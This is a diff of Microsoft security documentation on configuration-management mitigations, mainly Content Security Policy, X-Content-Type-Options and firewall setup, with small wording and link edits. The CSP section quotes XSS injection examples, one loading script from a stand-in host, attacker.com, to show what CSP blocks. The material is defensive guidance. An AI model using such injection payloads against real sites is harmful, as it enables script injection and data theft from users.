@@ -1,7 +1,7 @@
 ---
 title: Configuration management for the Microsoft Threat Modeling Tool 
 titleSuffix: Azure
-description: mitigations for threats exposed in the Threat Modeling Tool 
+description: Learn about configuration management for the Threat Modeling Tool. See mitigation information and view code examples.
 services: security
 documentationcenter: na
 author: jegeib
@@ -17,7 +17,7 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-
+ms.custom: "devx-track-js, devx-track-csharp"
 ---
 
 # Security Frame: Configuration Management | Mitigations 
@@ -42,7 +42,7 @@ ms.author: jegeib
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Content Security Policy Reference](https://content-security-policy.com/), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Steps** | <p>Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners to have control on the content embedded in their site. CSP is added as an HTTP response header on the web server and is enforced on the client side by browsers. It is a whitelist-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</p><p>CSP provides the following security benefits:</p><ul><li>**Protection against XSS:** If a page is vulnerable to XSS, an attacker can exploit it in 2 ways:<ul><li>Inject `<script>malicious code</script>`. This exploit will not work due to CSP's Base Restriction-1</li><li>Inject `<script src="http://attacker.com/maliciousCode.js"/>`. This exploit will not work since the attacker controlled domain will not be in CSP's whitelist of domains</li></ul></li><li>**Control over data exfiltration:** If any malicious content on a webpage attempts to connect to an external website and steal data, the connection will be aborted by CSP. This is because the target domain will not be in CSP's whitelist</li><li>**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users to click on UI elements. Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options. Not all browsers respect this header and going forward CSP will be a standard way to defend against click-jacking</li><li>**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification to an endpoint configured on the webserver. This way, CSP serves as a real-time warning system.</li></ul> |
+| **Steps** | <p>Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners to have control on the content embedded in their site. CSP is added as an HTTP response header on the web server and is enforced on the client side by browsers. It is a allowed list-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</p><p>CSP provides the following security benefits:</p><ul><li>**Protection against XSS:** If a page is vulnerable to XSS, an attacker can exploit it in 2 ways:<ul><li>Inject `<script>malicious code</script>`. This exploit will not work due to CSP's Base Restriction-1</li><li>Inject `<script src="http://attacker.com/maliciousCode.js"/>`. This exploit will not work since the attacker controlled domain will not be in CSP's allowed list of domains</li></ul></li><li>**Control over data exfiltration:** If any malicious content on a webpage attempts to connect to an external website and steal data, the connection will be aborted by CSP. This is because the target domain will not be in CSP's allowed list</li><li>**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users to click on UI elements. Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options. Not all browsers respect this header and going forward CSP will be a standard way to defend against click-jacking</li><li>**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification to an endpoint configured on the webserver. This way, CSP serves as a real-time warning system.</li></ul> |
 
 ### Example
 Example policy: 
@@ -209,7 +209,7 @@ Please note that Request Validation feature is not supported, and is not part of
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
-| **References**              | [IE8 Security Part V: Comprehensive Protection](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME type](https://en.wikipedia.org/wiki/Mime_type) |
+| **References**              | [IE8 Security Part V: Comprehensive Protection](https://docs.microsoft.com/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [MIME type](https://en.wikipedia.org/wiki/Mime_type) |
 | **Steps** | The X-Content-Type-Options header is an HTTP header that allows developers to specify that their content should not be MIME-sniffed. This header is designed to mitigate MIME-Sniffing attacks. For each page that could contain user controllable content, you must use the HTTP Header X-Content-Type-Options:nosniff. To enable the required header globally for all pages in the application, you can do one of the following|
 
 ### Example
@@ -285,7 +285,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | SQL Azure, OnPrem |
 | **Attributes**              | N/A, SQL Version - V12 |
-| **References**              | [How to configure an Azure SQL database firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Configure a Windows Firewall for Database Engine Access](https://msdn.microsoft.com/library/ms175043) |
+| **References**              | [How to configure an Azure SQL Database firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Configure a Windows Firewall for Database Engine Access](https://msdn.microsoft.com/library/ms175043) |
 | **Steps** | Firewall systems help prevent unauthorized access to computer resources. To access an instance of the SQL Server Database Engine through a firewall, you must configure the firewall on the computer running SQL Server to allow access |
 
 ## <a id="cors-api"></a>Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web API
